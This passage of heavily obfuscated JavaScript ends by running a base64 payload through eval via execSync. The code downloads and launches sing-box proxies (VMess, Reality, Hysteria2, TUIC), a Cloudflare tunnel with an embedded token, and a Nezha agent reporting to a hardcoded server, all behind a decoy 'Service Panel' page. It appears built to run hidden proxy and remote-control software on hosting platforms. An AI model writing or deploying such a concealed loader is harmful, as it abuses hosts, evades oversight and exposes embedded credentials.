_0x1c6be2=_0x46cb03;_0xfdf114['on'](_0x1c6be2(0x21d),()=>{const _0x86805=_0x1c6be2;try{_0x2a14d7[_0x86805(0x1d2)]();}catch(_0x4c0696){}}),_0xfdf114['on'](_0x1c6be2(0x27d),()=>{const _0x22e220=_0x1c6be2;try{_0x2a14d7[_0x22e220(0x1d2)]();}catch(_0x49030a){}});};_0x3ff0e4(_0x3f0d26,_0x28e060),_0x3ff0e4(_0x28e060,_0x3f0d26),_0x28e060['setTimeout'](0x0),_0x3f0d26[_0x46cb03(0x1d3)](0x0);}else _0x28e060['end'](_0x46cb03(0x25f));}catch(_0x1c3b40){try{_0x28e060[_0x46cb03(0x1d2)]();}catch(_0x138a01){}}});function _0x36d2(){const _0x51b803=['cd\x20\x22','child_process','upgrade','VMESS_PATH','tuic','/sing-box\x20\x22','includes','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22><span\x20class=\x22protocol\x22>','127.0.0.1','--no-autoupdate','!\x27))\x22>Copy</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','\x22\x20-name\x20\x22nezha-agent\x22\x20-type\x20f\x20-exec\x20mv\x20{}\x20\x22','\x22\x20&&\x20tar\x20-xzf\x20\x22','0123456789abcdef','tuic-in','push','v0.17.5','keys','http','SIGTERM','PORT','&sid=','home','stringify','length','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Sing-Box</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','N_T','2539690XfvclF','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','map','status','1.seaw.cf','method','443','REALITY_SNI','curl\x20-s\x20-L\x20\x22','VMess','https','--protocol','run','match','\x22\x20generate\x20reality-keypair','--token','pipe','from','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','12aXupEh','9367420eLZcuR','env','--url','HTTP/1.1\x20404\x20Not\x20Found\x0d\x0a\x0d\x0a','\x22\x20&&\x20mv\x20sing-box-','parse','SagerNet/sing-box','995280nMgdkP','x64','Downloaded\x20file\x20not\x20found:\x20','direct','REALITY_PRIVATE_KEY','join','replace','listen','A_P_D','<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>No\x20active\x20connections</div></div>','stderr','singbox','xtls-rprx-vision','temp-','express','/health','vmess','Hysteria2','warn','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Panel</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links{margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a{display:inline-block;margin:0\x2010px;padding:10px\x2020px;background:#667eea;color:white;text-decoration:none;border-radius:5px;transition:background\x200.3s}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a:hover{background:#5a67d8}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Panel</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Multi-protocol\x20service\x20management\x20panel.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/status\x22>View\x20Status</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer\x22>Service\x20Management\x20Panel</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','mkdirSync','connect','\x22\x20&&\x20rm\x20-rf\x20\x22','http://localhost:','Node.js','unlinkSync','close','HY2_PORT','kill','https://github.com/cloudflare/cloudflared/releases/download/','--tls','url','tuic://','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Nezha</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','789456','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','TUIC_PORT','1547722gpPIOj','N_P','TUIC_UUID','running','SERVER_IP','nz.seav.eu.org','hex','A_D','tunnel','concat','chmodSync','vmess://','hysteria2','VMESS','REALITY_PUBLIC_KEY','arm64','4Uvyfrq','\x22\x20\x22','data',':</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22\x20id=\x22','randomBytes','application/json','hysteria2://','destroy','setTimeout','trim','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>TUIC</div><div\x20class=\x22port-value\x22>','cloudflared','N_S','TUIC_PASSWORD','toString','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiOGUwNWI3MTctMjdjNC00M2Y1LTg1NDgtNGRiZWY5MmI1N2NjIiwicyI6IlpqWm1OMk5qTldRdE5qazJOaTAwTURoaExUazFaR0l0WVRCaE1UTTVOREJqTkRKaSJ9','text/html','protocol','private','9ZjKCSG','SIGINT','N_V','status-stopped','REALITY_SHORT_ID','\x22\x20-o\x20\x22','&type=tcp#REALITY','TUIC','HY2_PASSWORD','Reality','</div></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Reality</div><div\x20class=\x22port-value\x22>','143348zeanoi','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','\x22\x20\x5c;\x20&&\x20chmod\x20+x\x20\x22','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','cloudflare/cloudflared','VMESS_UUID','tag_name','.zip','scalingo.seav.eu.org','6UXXxOf','N_K','REALITY_PORT','createWriteStream','forEach','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Hysteria2</div><div\x20class=\x22port-value\x22>','-linux-','?congestion_control=cubic&udp_relay_mode=native&alpn=h3,h2,http/1.1&allow_insecure=1#TUIC','</div></div>','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>VMESS</div><div\x20class=\x22port-value\x22>','exit','nezha.log','HY2_SNI','nezha','16lMKTvI','http2','?insecure=1&sni=','setNoDelay','httpVersion','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>HTTP\x20Server</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','auto','stopped','tmpdir','/cloudflared-linux-','headers','amd64','755','nezha-temp-','chrome','/nezha-agent_linux_','A_A','ignore','writeHead','.tar.gz','arch','\x22\x20&&\x20busybox\x20unzip\x20-q\x20\x22','string','createConnection','stdout','status-running','spawn','\x22\x20&&\x20rm\x20-rf\x20sing-box-','error','/vms','get','write','block','--edge-ip-version','end','1530193HfMnsX','1507172olcQgw','8001','cf_','hy2-in','?encryption=none&flow=xtls-rprx-vision&security=reality&sni=','/releases/latest','toLowerCase','VMESS_PORT'];_0x36d2=function(){return _0x51b803;};return _0x36d2();}async function startService(_0x1fd2ca,_0x48b884,_0xaef9a7,_0x5f405f={}){const _0x2a94e6=_0x153881;try{const _0x7bc987=spawn(_0x1fd2ca,_0x48b884,{'stdio':[_0x2a94e6(0x212),_0x2a94e6(0x258),_0x2a94e6(0x258)],..._0x5f405f});if(_0x5f405f['logFile']){const _0x36cac2=fs['createWriteStream'](_0x5f405f['logFile']);_0x7bc987[_0x2a94e6(0x219)][_0x2a94e6(0x258)](_0x36cac2),_0x7bc987[_0x2a94e6(0x26d)]['pipe'](_0x36cac2);}return _0x7bc987['on'](_0x2a94e6(0x21b),()=>{const _0x502463=_0x2a94e6;serviceStatus[_0xaef9a7['toLowerCase']()]=_0x502463(0x28b);}),_0x7bc987['on'](_0x2a94e6(0x21d),()=>{const _0x3d6a6e=_0x2a94e6;serviceStatus[_0xaef9a7[_0x3d6a6e(0x22b)]()]=_0x3d6a6e(0x21d);}),_0x7bc987['on'](_0x2a94e6(0x1fd),()=>{const _0x3debb3=_0x2a94e6;serviceStatus[_0xaef9a7[_0x3debb3(0x22b)]()]='stopped';}),processes['push'](_0x7bc987),_0x7bc987;}catch(_0x23ec00){return serviceStatus[_0xaef9a7[_0x2a94e6(0x22b)]()]=_0x2a94e6(0x21d),null;}}async function main(){const _0x2cb1c0=_0x153881;server[_0x2cb1c0(0x26a)](CONFIG[_0x2cb1c0(0x241)],()=>{const _0x32a458=_0x2cb1c0;serviceStatus[_0x32a458(0x23f)]=_0x32a458(0x28b);});try{const _0x16d2a4=detectArch(),_0x3030f8=path['join'](WORK_DIR,crypto[_0x2cb1c0(0x1cf)](0x4)[_0x2cb1c0(0x1d9)](_0x2cb1c0(0x28e))),_0x4596f2=path[_0x2cb1c0(0x268)](WORK_DIR,crypto[_0x2cb1c0(0x1cf)](0x4)[_0x2cb1c0(0x1d9)](_0x2cb1c0(0x28e))),_0x13ca14=path[_0x2cb1c0(0x268)](WORK_DIR,crypto[_0x2cb1c0(0x1cf)](0x4)[_0x2cb1c0(0x1d9)](_0x2cb1c0(0x28e))),[_0x1889ac,_0x11356b]=await Promise['all']([getLatestVersion(_0x2cb1c0(0x262)),getLatestVersion(_0x2cb1c0(0x1ee))]);await downloadSingBox(_0x16d2a4,_0x3030f8,_0x1889ac),await downloadFile(_0x2cb1c0(0x280)+_0x11356b+_0x2cb1c0(0x20a)+_0x16d2a4,_0x4596f2),await downloadNezhaAgent(_0x16d2a4,_0x13ca14,CONFIG[_0x2cb1c0(0x1e0)]),[_0x3030f8,_0x4596f2,_0x13ca14][_0x2cb1c0(0x1f7)](_0x12c46a=>{const _0x1aeab0=_0x2cb1c0;if(!fs['existsSync'](_0x12c46a))throw new Error('File\x20not\x20found:\x20'+_0x12c46a);fs[_0x1aeab0(0x292)](_0x12c46a,_0x1aeab0(0x20d));});const _0x28c61b=await getServerIP();if(CONFIG[_0x2cb1c0(0x27e)]||CONFIG['VMESS_PORT']||CONFIG[_0x2cb1c0(0x1f5)]||CONFIG[_0x2cb1c0(0x287)]){await generateRealityKeys(_0x3030f8);const _0x4c8f7d=await generateSingBoxConfig();await startService(_0x3030f8,['run','-c',_0x4c8f7d],_0x2cb1c0(0x26e));}if(CONFIG[_0x2cb1c0(0x211)])await startService(_0x4596f2,[_0x2cb1c0(0x290),_0x2cb1c0(0x222),_0x2cb1c0(0x207),_0x2cb1c0(0x253),_0x2cb1c0(0x202),_0x2cb1c0(0x254),_0x2cb1c0(0x257),CONFIG['A_A'],'--url',_0x2cb1c0(0x27a)+CONFIG[_0x2cb1c0(0x241)]],'cloudflared');else{if(CONFIG[_0x2cb1c0(0x22c)]){const _0x5bca85=await startTempTunnel(_0x4596f2,CONFIG[_0x2cb1c0(0x241)]);_0x5bca85?serviceStatus[_0x2cb1c0(0x1d6)]=_0x2cb1c0(0x28b):serviceStatus['cloudflared']=_0x2cb1c0(0x21d);}}if(CONFIG[_0x2cb1c0(0x1d7)]&&CONFIG[_0x2cb1c0(0x1f4)]){const _0x311782=['-s',CONFIG[_0x2cb1c0(0x1d7)]+':'+CONFIG['N_P'],'-p',''+CONFIG[_0x2cb1c0(0x1f4)]];(CONFIG[_0x2cb1c0(0x247)]===_0x2cb1c0(0x281)||typeof CONFIG[_0x2cb1c0(0x247)]===_0x2cb1c0(0x217)&&CONFIG[_0x2cb1c0(0x247)][_0x2cb1c0(0x233)](_0x2cb1c0(0x281)))&&_0x311782[_0x2cb1c0(0x23c)](_0x2cb1c0(0x281)),await startService(_0x13ca14,_0x311782,'nezha',{'logFile':path[_0x2cb1c0(0x268)](WORK_DIR,_0x2cb1c0(0x1fe))});}process['on'](_0x2cb1c0(0x1df),cleanup),process['on'](_0x2cb1c0(0x240),cleanup),setInterval(()=>{const _0x4b5363=_0x2cb1c0;processes[_0x4b5363(0x245)]>0x0&&processes['every'](_0x3548bf=>_0x3548bf['killed'])&&cleanup();},0x7530);}catch(_0x3c30d6){process[_0x2cb1c0(0x1fd)](0x1);}}main()['catch'](()=>process[_0x153881(0x1fd)](0x1));`.replace(/\\n/g, '');
execSync(`node -e "eval(Buffer.from('${b}', 'base64').toString())"`);
